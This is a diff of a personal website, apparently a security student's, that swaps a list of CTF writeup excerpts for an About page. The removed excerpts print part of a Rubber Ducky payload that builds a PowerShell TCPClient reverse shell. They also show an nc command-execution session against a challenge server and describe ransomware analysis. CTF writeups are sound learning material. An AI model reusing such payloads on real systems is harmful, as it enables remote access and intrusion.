@@ -1,6 +1,6 @@
 <!doctype html><html lang=en>
 <head>
-<meta name=generator content="Hugo 0.88.1">
+<meta name=generator content="Hugo 0.89.4">
 <title>Nicolas Bourras</title>
 <meta charset=utf-8>
 <meta name=viewport content="width=device-width,initial-scale=1">
@@ -40,285 +40,56 @@ Nicolas Bourras
 </div>
 <nav class=menu>
 <ul class="menu__inner menu__inner--desktop">
-<li><a href=/about>About</a></li>
-<li><a href=/>Posts</a></li>
+<li><a href=/>About</a></li>
+<li><a href=/blog>Blog</a></li>
 <li><a href=/recipes>Recipes</a></li>
 </ul>
 <ul class="menu__inner menu__inner--mobile">
-<li><a href=/about>About</a></li>
-<li><a href=/>Posts</a></li>
+<li><a href=/>About</a></li>
+<li><a href=/blog>Blog</a></li>
 <li><a href=/recipes>Recipes</a></li>
 </ul>
 </nav>
 </header>
 <div class=content>
-<div class=posts>
-<div class="post on-list">
+<div class=post>
 <h1 class=post-title>
-<a href=https://nicolasb.fr/blog/cyber-threat-force-ctf/>Cyber Threat Force (CTF)</a>
-</h1>
+<a href=https://nicolasb.fr/>About me</a></h1>
 <div class=post-meta>
-<span class=post-date>
-2021-07-11
-</span>
 </div>
-<span class=post-tags>
-#<a href=https://nicolasb.fr/tags/blog/>blog</a>&nbsp;
-#<a href=https://nicolasb.fr/tags/security/>security</a>&nbsp;
-#<a href=https://nicolasb.fr/tags/ctf/>ctf</a>&nbsp;
-#<a href=https://nicolasb.fr/tags/cyber-threat-force/>cyber-threat-force</a>&nbsp;
-</span>
-<div class=post-content>
-This was a short CTF (48h), a format that I like since it doesn&rsquo;t eat up too much of my time. I enjoyed it with my friends: Lukho, R0ck3t and Volker. We registered a team on CTFTime: Root Root.
-We ranked 4th out of 197 teams, scoring 6935 points. And I personnaly ranked 6th, scoring 3775 points and completing 19 challenges!
-Here are the challenges that I completed or spent time on, with links to my writeups:
-</div>
-<div>
-<a class="read-more button" href=/blog/cyber-threat-force-ctf/>Read more →</a>
-</div>
-</div>
-<div class="post on-list">
-<h1 class=post-title>
-<a href=https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-misc-azkaban-c2/>Writeup Cyber Threat Force : Azkaban C2</a>
-</h1>
-<div class=post-meta>
-<span class=post-date>
-2021-07-11
-</span>
-</div>
-<span class=post-tags>
-#<a href=https://nicolasb.fr/tags/blog/>blog</a>&nbsp;
-#<a href=https://nicolasb.fr/tags/security/>security</a>&nbsp;
-#<a href=https://nicolasb.fr/tags/ctf/>ctf</a>&nbsp;
-#<a href=https://nicolasb.fr/tags/cyber-threat-force/>cyber-threat-force</a>&nbsp;
-#<a href=https://nicolasb.fr/tags/misc/>misc</a>&nbsp;
-</span>
-<div class=post-content>
-For this challenge, we were given a python script:
-import socket def menu(): print("______________________") print("| MENU |") print("| 1) see option |") print("| 2) edit option |") print("| 3) connect |") print("______________________") print(""" ______ __ __ ______ / \ / | / | / \ /$$$$$$ | ________ $$ | __ ______ $$ |____ ______ _______ _______ /$$$$$$ | $$ |__$$ |/ |$$ | / | / \ $$ \ / \ / \ / |$$____$$ | $$ $$ |$$$$$$$$/ $$ |_/$$/ $$$$$$ |$$$$$$$ | $$$$$$ |$$$$$$$ | /$$$$$$$/ / $$/ $$$$$$$$ | / $$/ $$ $$&lt; / $$ |$$ | $$ | / $$ |$$ | $$ | $$ | /$$$$$$/ $$ | $$ | /$$$$/__ $$$$$$ \ /$$$$$$$ |$$ |__$$ |/$$$$$$$ |$$ | $$ | $$ \_____ $$ |_____ $$ | $$ |/$$ |$$ | $$ |$$ $$ |$$ $$/ $$ $$ |$$ | $$ | $$ |$$ | $$/ $$/ $$$$$$$$/ $$/ $$/ $$$$$$$/ $$$$$$$/ $$$$$$$/ $$/ $$/ $$$$$$$/ $$$$$$$$/ -----=[Azkaban C2 v.
-</div>
-<div>
-<a class="read-more button" href=/blog/writeup-cyber-threat-force-2021-misc-azkaban-c2/>Read more →</a>
-</div>
-</div>
-<div class="post on-list">
-<h1 class=post-title>
-<a href=https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-forensic-like-a-duck-in-water/>Writeup Cyber Threat Force : Like a duck in water</a>
-</h1>
-<div class=post-meta>
-<span class=post-date>
-2021-07-11
-</span>
-</div>
-<span class=post-tags>
-#<a href=https://nicolasb.fr/tags/blog/>blog</a>&nbsp;
-#<a href=https://nicolasb.fr/tags/security/>security</a>&nbsp;
-#<a href=https://nicolasb.fr/tags/ctf/>ctf</a>&nbsp;
-#<a href=https://nicolasb.fr/tags/cyber-threat-force/>cyber-threat-force</a>&nbsp;
-#<a href=https://nicolasb.fr/tags/forensic/>forensic</a>&nbsp;
-</span>
-<div class=post-content>
-Note: I did not solve this challenge during the CTF, but my teammate Lukho did.
-For this challenge, we were given an inject.bin file, which contains an encoded Rubber Ducky payload. We can use the Duck Toolkit to get back the original code:
-DELAY DELAY powershell Start-Process notepad -Verb runAsENTER DELAY DELAY ENTER DELAY mDELAY DOWNARROW ... DOWNARROW ENTER $folderDateTime = (get-date).ToString('d-M-y HHmmss')ENTER ... Add-Content "$env:TEMP\72794.ps1" '$c = New-Object System.Net.Sockets.TCPClient("CYBERTF{D0N4LD_DUC|&lt;}",443);$s = $c.
-</div>
-<div>
-<a class="read-more button" href=/blog/writeup-cyber-threat-force-2021-forensic-like-a-duck-in-water/>Read more →</a>
-</div>
-</div>
-<div class="post on-list">
-<h1 class=post-title>
-<a href=https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-forensic-usb-key-cemetery/>Writeup Cyber Threat Force : Usb key cemetery</a>
-</h1>
-<div class=post-meta>
-<span class=post-date>
-2021-07-11
-</span>
-</div>
-<span class=post-tags>
-#<a href=https://nicolasb.fr/tags/blog/>blog</a>&nbsp;
-#<a href=https://nicolasb.fr/tags/security/>security</a>&nbsp;
-#<a href=https://nicolasb.fr/tags/ctf/>ctf</a>&nbsp;
-#<a href=https://nicolasb.fr/tags/cyber-threat-force/>cyber-threat-force</a>&nbsp;
-#<a href=https://nicolasb.fr/tags/forensic/>forensic</a>&nbsp;
-</span>
-<div class=post-content>
-Note: I did not solve this challenge during the CTF, but my teammate Volker did.
-For this challenge, we were given a zip containing an encoded syslog (sysloc.enc), and an auth.json file:
-{ "manufact": [ "Apple Inc.", "Azurewave", "Generic", "Linux 5.10.0-kali8-amd64 xhci-hcd", "usbrip-4381" ], "pid": [ "0002", "0003", "0129", "0608", "12a8", "3491", "56dd", "usbrip-4381" ], "prod": [ "USB2.0 HD UVC WebCam", "USB2.0 Hub", "USB2.0-CRW", "iPhone", "usbrip-4381", "xHCI Host Controller" ], "serial": [ "0000:03:00.
-</div>
-<div>
-<a class="read-more button" href=/blog/writeup-cyber-threat-force-2021-forensic-usb-key-cemetery/>Read more →</a>
-</div>
-</div>
-<div class="post on-list">
-<h1 class=post-title>
-<a href=https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-reverse-trojan-tools/>Writeup Cyber Threat Force : Trojan tools</a>
-</h1>
-<div class=post-meta>
-<span class=post-date>
-2021-07-11
-</span>
-</div>
-<span class=post-tags>
-#<a href=https://nicolasb.fr/tags/blog/>blog</a>&nbsp;
-#<a href=https://nicolasb.fr/tags/security/>security</a>&nbsp;
-#<a href=https://nicolasb.fr/tags/ctf/>ctf</a>&nbsp;
-#<a href=https://nicolasb.fr/tags/cyber-threat-force/>cyber-threat-force</a>&nbsp;
-#<a href=https://nicolasb.fr/tags/reverse/>reverse</a>&nbsp;
-</span>
-<div class=post-content>
-For this challenge, we were given a TROJAN_TOOLS.exe file. Before manually analyzing it, I tried feeding it to hybrid analysis.
-Here is the link to the full report.
-The &ldquo;Interesting strings&rdquo; section contained the flag: CYBERTF{Y0u_H4s_P3wn_Th3_H4ck_T0ol}.
-We can also try to solve the challenge in a more conventional way. Executing the application gives us:
-C:\Users\IEUser\Desktop>original.exe Please enter the good PIN Using a process monitor We can use procmon from the Sysinternals suite to monitor the process.
-</div>
-<div>
-<a class="read-more button" href=/blog/writeup-cyber-threat-force-2021-reverse-trojan-tools/>Read more →</a>
-</div>
-</div>
-<div class="post on-list">
-<h1 class=post-title>
-<a href=https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-reverse-viking-crypt/>Writeup Cyber Threat Force : Viking crypt</a>
-</h1>
-<div class=post-meta>
-<span class=post-date>
-2021-07-11
-</span>
-</div>
-<span class=post-tags>
-#<a href=https://nicolasb.fr/tags/blog/>blog</a>&nbsp;
-#<a href=https://nicolasb.fr/tags/security/>security</a>&nbsp;
-#<a href=https://nicolasb.fr/tags/ctf/>ctf</a>&nbsp;
-#<a href=https://nicolasb.fr/tags/cyber-threat-force/>cyber-threat-force</a>&nbsp;
-#<a href=https://nicolasb.fr/tags/reverse/>reverse</a>&nbsp;
-</span>
-<div class=post-content>
-For this challenge, we were given a ransomware (VIKING_CRYPT.exe and VIKING_DECRYPT.exe) along with a LOCKER.HTML file and IMPORTANT_NOTE.txt.vkg.
-Let&rsquo;s take a look at that encrypted note:
-$ file Perso/IMPORTANT_NOTE.txt.vkg Perso/IMPORTANT_NOTE.txt.vkg: ASCII text, with no line terminators $ cat Perso/IMPORTANT_NOTE.txt.vkg 8a9b600b5a745d39cb7c7e7890e816848a9fe77280b42ca0751d150bb849 It doesn&rsquo;t really look like any encryption I know.
-We can try to run VIKING_DECRYPT.exe:
-As expected, we&rsquo;re asked for a decryption key. Let&rsquo;s encrypt a few files in a VM, and compare the plaintext and the .
-</div>
-<div>
-<a class="read-more button" href=/blog/writeup-cyber-threat-force-2021-reverse-viking-crypt/>Read more →</a>
-</div>
-</div>
-<div class="post on-list">
-<h1 class=post-title>
-<a href=https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-crypto-unefficient-encryption/>Writeup Cyber Threat Force : (Un)Efficient encryption</a>
-</h1>
-<div class=post-meta>
-<span class=post-date>
-2021-07-10
-</span>
-</div>
-<span class=post-tags>
-#<a href=https://nicolasb.fr/tags/blog/>blog</a>&nbsp;
-#<a href=https://nicolasb.fr/tags/security/>security</a>&nbsp;
-#<a href=https://nicolasb.fr/tags/ctf/>ctf</a>&nbsp;
-#<a href=https://nicolasb.fr/tags/cyber-threat-force/>cyber-threat-force</a>&nbsp;
-#<a href=https://nicolasb.fr/tags/crypto/>crypto</a>&nbsp;
-</span>
-<div class=post-content>
-For this challenge, we were given two pcapng files, comm1.pcapng and comm2.pcapng, and a text file. The text file contains this:
-Bonjour Agent-CTF,
-Nous avons recemment interceptés un message, chiffré grace a un algorithme inconnu. Nous avons mis en relation ce message a un message anterieur, contenant une discussion suspecte entre deux membres de l&rsquo;APT.
-Votre mission sera de dechiffrer les communications.
-Bonne chance
-Q.G.
-We can use tshark to view the raw data of the network captures:
-</div>
-<div>
-<a class="read-more button" href=/blog/writeup-cyber-threat-force-2021-crypto-unefficient-encryption/>Read more →</a>
-</div>
-</div>
-<div class="post on-list">
-<h1 class=post-title>
-<a href=https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-reverse-the-document-is-strange/>Writeup Cyber Threat Force : The document is strange</a>
-</h1>
-<div class=post-meta>
-<span class=post-date>
-2021-07-10
-</span>
-</div>
-<span class=post-tags>
-#<a href=https://nicolasb.fr/tags/blog/>blog</a>&nbsp;
-#<a href=https://nicolasb.fr/tags/security/>security</a>&nbsp;
-#<a href=https://nicolasb.fr/tags/ctf/>ctf</a>&nbsp;
-#<a href=https://nicolasb.fr/tags/cyber-threat-force/>cyber-threat-force</a>&nbsp;
-#<a href=https://nicolasb.fr/tags/reverse/>reverse</a>&nbsp;
-</span>
-<div class=post-content>
-<p>For this challenge, we were given a <code>CV.doc</code> document. Opening it reveals a pretty normal looking resume template, and a warning about macros from LibreOffice.</p>
-<p>Using the macros menu, we can dump their code:</p>
-</div>
-<div>
-<a class="read-more button" href=/blog/writeup-cyber-threat-force-2021-reverse-the-document-is-strange/>Read more →</a>
-</div>
-</div>
-<div class="post on-list">
-<h1 class=post-title>
-<a href=https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-crypto-strange-service/>Writeup Cyber Threat Force : Strange service</a>
-</h1>
-<div class=post-meta>
-<span class=post-date>
-2021-07-10
-</span>
-</div>
-<span class=post-tags>
-#<a href=https://nicolasb.fr/tags/blog/>blog</a>&nbsp;
-#<a href=https://nicolasb.fr/tags/security/>security</a>&nbsp;
-#<a href=https://nicolasb.fr/tags/ctf/>ctf</a>&nbsp;
-#<a href=https://nicolasb.fr/tags/cyber-threat-force/>cyber-threat-force</a>&nbsp;
-#<a href=https://nicolasb.fr/tags/crypto/>crypto</a>&nbsp;
-</span>
-<div class=post-content>
-For this challenge, we were given access to a service. The description told us that it was an encryption oracle, which used AES to encrypt what we sent it, concatenated with critical data.
-I&rsquo;m writting this after the challenge ended, so I can&rsquo;t include demos.
-The description should make us think about byte-at-a-time ECB decryption attacks, which are well explained here:
-Cryptopals - Byte-a-time ECB decryption (Simple) Why is Byte-at-a-time ECB decryption a vulnerability?
-</div>
-<div>
-<a class="read-more button" href=/blog/writeup-cyber-threat-force-2021-crypto-strange-service/>Read more →</a>
-</div>
-</div>
-<div class="post on-list">
-<h1 class=post-title>
-<a href=https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-crypto-strange-administration-service/>Writeup Cyber Threat Force : Strange administration service</a>
-</h1>
-<div class=post-meta>
-<span class=post-date>
-2021-07-10
-</span>
-</div>
-<span class=post-tags>
-#<a href=https://nicolasb.fr/tags/blog/>blog</a>&nbsp;
-#<a href=https://nicolasb.fr/tags/security/>security</a>&nbsp;
-#<a href=https://nicolasb.fr/tags/ctf/>ctf</a>&nbsp;
-#<a href=https://nicolasb.fr/tags/cyber-threat-force/>cyber-threat-force</a>&nbsp;
-#<a href=https://nicolasb.fr/tags/crypto/>crypto</a>&nbsp;
-</span>
-<div class=post-content>
-For this challenge, we were given access to a server which we can connect to:
-$ nc 144.217.73.235 27099 give me cmd|token example: ls|c9af5ac08978481063b711f031f38518a7c2d83d6db3eabacbd7726470e8a140 id|69a4061766769d0a19ab59e6f905f7ac5875691b62765cb6b3b5ee6ae08f776a ls|c9af5ac08978481063b711f031f38518a7c2d83d6db3eabacbd7726470e8a140 chall.py wrapper $ nc 144.217.73.235 27099 give me cmd|token example: ls|c9af5ac08978481063b711f031f38518a7c2d83d6db3eabacbd7726470e8a140 id|69a4061766769d0a19ab59e6f905f7ac5875691b62765cb6b3b5ee6ae08f776a whoami|c9af5ac08978481063b711f031f38518a7c2d83d6db3eabacbd7726470e8a140 Bad Token It executes the command we give it, given that we know the corresponding hash. The challenge description told us that the hash format is HASH(SECRET || CMD).
-This should instantly make us think of hash key length extension attacks.
-</div>
-<div>
-<a class="read-more button" href=/blog/writeup-cyber-threat-force-2021-crypto-strange-administration-service/>Read more →</a>
-</div>
-</div>
-<div class=pagination>
-<div class=pagination__buttons>
-<span class="button next">
-<a href=/page/2/>
-<span class=button__text>Older posts</span>
-<span class=button__icon>→</span>
-</a>
-</span>
-</div>
-</div>
+<div class=post-content><div>
+<p>Hi! I&rsquo;m Nicolas Bourras, aka vivescere - a french student learning computer science and cybersecurity at the Aix-Marseille university. I&rsquo;m currently in my fifth and final year.</p>
+<p>I love cycling, programming, photography and more recently I started getting into <a href=/recipes>cooking</a> as well. I&rsquo;m also vegan.</p>
+<p>I mainly program in Rust these days, but I also regularly use Dart (with flutter) and python. I have experimented with a fairly large number of languages, and love learning new ones.</p>
+<p>You can find me online :</p>
+<ul>
+<li><a href=https://www.linkedin.com/in/nicolas-bourras/>on LinkedIn</a></li>
+<li><a href=https://root-me.org/vivescere>on root-me</a></li>
+<li><a href=https://www.youtube.com/channel/UCUMa_0xKvmL7bf7aiv8ngYQ>on youtube</a></li>
+<li><a href=https://www.hackthebox.eu/profile/427000>on hackthebox</a></li>
+<li><a href=https://github.com/vivescere>on github</a></li>
+<li><a href=https://www.twitch.tv/vivescere>on twitch</a></li>
+<li><a href=https://twitter.com/vivescere>on twitter</a></li>
+</ul>
+<p>Want to contact me? Send me an email at <a href=mailto:perso@nicolasb.fr>contact@nicolasb.fr</a>.</p>
+<h2 id=what-ive-been-working-on>What I&rsquo;ve been working on<a href=#what-ive-been-working-on class=hanchor arialabel=Anchor>&#8983;</a> </h2>
+<p>This section is a bit empty for now - I&rsquo;ve done a lot of school projets that aren&rsquo;t good enough to be here.</p>
+<h3 id=ctf---cyber-threat-force>CTF - Cyber Threat Force<a href=#ctf---cyber-threat-force class=hanchor arialabel=Anchor>&#8983;</a> </h3>
+<p>I also wrote an article on this CTF, which you can read <a href=/blog/cyber-threat-force-ctf/>here</a>. My team ranked fourth, and I ranked sixth!</p>
+<h3 id=ctf---dghack>CTF - DG&rsquo;hAck<a href=#ctf---dghack class=hanchor arialabel=Anchor>&#8983;</a> </h3>
+<p>I wrote an article on this CTF, which you can read <a href=/blog/dghack-my-second-ctf/>here</a>. It&rsquo;s complete with writeups for 14 challenges, out of the 16 I&rsquo;ve completed.</p>
+<p>I ranked first out of all the students ; there was only 3 challenges that I didn&rsquo;t manage to solve, I still need to get better at reverse engineering / binary exploitation!</p>
+<h3 id=ctf---dgse---brigitte-friang>CTF - DGSE - Brigitte Friang<a href=#ctf---dgse---brigitte-friang class=hanchor arialabel=Anchor>&#8983;</a> </h3>
+<p>My first CTF! I ranked 61 ouf of 785 teams, while being alone. It was a great learning experience.</p>
+<h3 id=introduction-to-flutter>Introduction to Flutter<a href=#introduction-to-flutter class=hanchor arialabel=Anchor>&#8983;</a> </h3>
+<p><a href="https://www.youtube.com/watch?v=524K0rNP6wc&list=PL-sAExtisOFBM8O9f6gCCBWq2ndJAmDuG">View the playlist on youtube</a></p>
+<p>This series of videos (in french) was an attempt at teaching Flutter, a framework made by Google which is used to create mobile applications. Unfortunately, it didn&rsquo;t go very far because I started working on some other projects.</p>
+<h3 id=beacon-2016>Beacon (2016)<a href=#beacon-2016 class=hanchor arialabel=Anchor>&#8983;</a> </h3>
+<p><a href="https://play.google.com/store/apps/details?id=com.vivescere.beacon">View the application on the play store</a></p>
+<p><strong>NOTE</strong>: the application was taken offline for a while, because I have to update it so that it remains compliant with the Play Store policy.</p>
+<p>This application allows an athlete (or anyone who wants to, really) to share their location in realtime.</p>
+<p>I use it to stay safe when I go cycling. Sometimes you go out for a really long time, and knowing that the contacts you chose can check on you in a few seconds really lifts a weight off your shoulders.</p>
+</div></div>
 </div>
 </div>
 <footer class=footer>
